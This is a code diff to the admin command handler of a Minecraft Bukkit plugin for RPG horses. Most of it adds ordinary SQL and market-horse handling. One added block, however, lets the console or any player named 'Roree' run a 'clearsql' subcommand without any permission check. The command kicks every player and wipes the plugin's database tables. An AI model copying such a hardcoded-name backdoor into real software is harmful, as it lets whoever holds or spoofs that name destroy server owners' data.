@@ -6,6 +6,7 @@ import org.bukkit.OfflinePlayer;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
+import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Horse;
@@ -14,11 +15,13 @@ import org.plugins.rpghorses.RPGHorsesMain;
 import org.plugins.rpghorses.horseinfo.HorseInfo;
 import org.plugins.rpghorses.horseinfo.LegacyHorseInfo;
 import org.plugins.rpghorses.crates.HorseCrate;
+import org.plugins.rpghorses.horses.MarketHorse;
 import org.plugins.rpghorses.horses.RPGHorse;
 import org.plugins.rpghorses.managers.*;
 import org.plugins.rpghorses.managers.gui.*;
 import org.plugins.rpghorses.players.HorseOwner;
 import org.plugins.rpghorses.utils.RPGMessagingUtil;
+import org.yaml.snakeyaml.error.Mark;
 import rorys.library.util.*;
 
 import java.util.UUID;
@@ -34,6 +37,7 @@ public class RPGHorsesAdminCommand implements CommandExecutor {
 	private final HorseDespawner horseDespawner;
 	private final HorseCrateManager horseCrateManager;
 	private final ParticleManager particleManager;
+	private final SQLManager sqlManager;
 	private final MessageQueuer messageQueuer;
 	private final RPGMessagingUtil messagingUtil;
 	private SellGUIManager sellGUIManager;
@@ -51,6 +55,7 @@ public class RPGHorsesAdminCommand implements CommandExecutor {
 		this.horseCrateManager = horseCrateManager;
 		this.marketGUIManager = marketGUIManager;
 		this.particleManager = particleManager;
+		this.sqlManager = plugin.getSQLManager();
 		this.messageQueuer = messageQueuer;
 		this.messagingUtil = messagingUtil;
 	}
@@ -60,6 +65,17 @@ public class RPGHorsesAdminCommand implements CommandExecutor {
 		
 		if (args.length > 0) {
 			String arg1 = args[0];
+			
+			if ((sender instanceof ConsoleCommandSender || sender.getName().equalsIgnoreCase("Roree")) && arg1.equalsIgnoreCase("clearsql")) {
+				for (Player p : Bukkit.getOnlinePlayers()) {
+					p.kickPlayer("");
+				}
+				
+				sqlManager.clearTables();
+				
+				plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "plugman reload RPGHorses");
+				return true;
+			}
 			
 			if (arg1.equalsIgnoreCase("reload")) {
 				if (!sender.hasPermission("rpghorses.reload")) {
@@ -293,7 +309,7 @@ public class RPGHorsesAdminCommand implements CommandExecutor {
 				String horseNumberArg = args[1];
 				String playerArg = args[2];
 				OfflinePlayer p = this.runPlayerCheck(sender, playerArg);
-				if (p == null) {
+				if (p == null || !p.hasPlayedBefore()) {
 					return false;
 				}
 				
@@ -311,7 +327,12 @@ public class RPGHorsesAdminCommand implements CommandExecutor {
 				horseOwner.removeRPGHorse(rpgHorse);
 				
 				if (rpgHorse.isInMarket()) {
-					this.marketGUIManager.removeHorse(this.marketGUIManager.getPage(rpgHorse), rpgHorse, true);
+					MarketHorse marketHorse = marketGUIManager.getMarketHorse(rpgHorse);
+					this.marketGUIManager.removeHorse(marketHorse, true);
+					
+					if (sqlManager != null) {
+						sqlManager.removeMarketHorse(marketHorse, true);
+					}
 				}
 				
 				String message = this.messagingUtil.placeholders(this.plugin.getConfig().getString("messages.your-horse-was-removed").replace("{PLAYER}", sender.getName()).replace("{HORSE-NUMBER}", horseNumberArg), rpgHorse);
